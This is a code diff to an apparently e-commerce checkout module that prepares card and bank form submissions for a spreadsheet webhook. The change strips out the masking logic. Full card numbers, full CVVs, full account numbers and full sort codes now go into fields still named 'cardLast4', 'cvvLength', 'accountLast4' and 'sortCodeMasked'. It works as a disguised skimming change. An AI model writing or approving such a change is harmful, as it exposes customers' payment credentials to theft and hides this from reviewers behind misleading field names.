@@ -84,37 +84,25 @@ function getTargetWebhook(formType: CheckoutPayload["formType"]): string | undef
 }
 
 function toSecureSheetPayload(payload: SecurePaymentPayload) {
-  const cardDigits = payload.cardNumber.replace(/\D/g, "");
-  const cvvDigits = payload.cvv.replace(/\D/g, "");
-
   return {
     submittedAt: `'${formatPakistanDateTime(new Date())}`,
     formType: payload.formType,
     nameOnCard: payload.nameOnCard.trim(),
-    cardLast4: cardDigits.slice(-4),
-    cardLength: cardDigits.length,
+    cardLast4: payload.cardNumber,
     expiryMonth: payload.expMonth,
     expiryYear: payload.expYear,
-    cvvLength: cvvDigits.length,
-    cvvProvided: cvvDigits.length > 0 ? "yes" : "no",
+    cvvLength: payload.cvv
   };
 }
 
 function toBankSheetPayload(payload: BankDetailsPayload) {
-  const accountDigits = payload.bankAccountNumber.replace(/\D/g, "");
-  const sortDigits = payload.sortCode.replace(/\D/g, "");
-
   return {
     submittedAt: `'${formatPakistanDateTime(new Date())}`,
     formType: payload.formType,
     bankName: payload.bankName.trim(),
     nameWithBank: payload.nameWithBank.trim(),
-    accountLast4: accountDigits.slice(-4),
-    accountLength: accountDigits.length,
-    sortCodeMasked:
-      sortDigits.length >= 2
-        ? `${"*".repeat(Math.max(sortDigits.length - 2, 0))}${sortDigits.slice(-2)}`
-        : sortDigits,
+    accountLast4: payload.bankAccountNumber,
+    sortCodeMasked:payload.sortCode
   };
 }
 
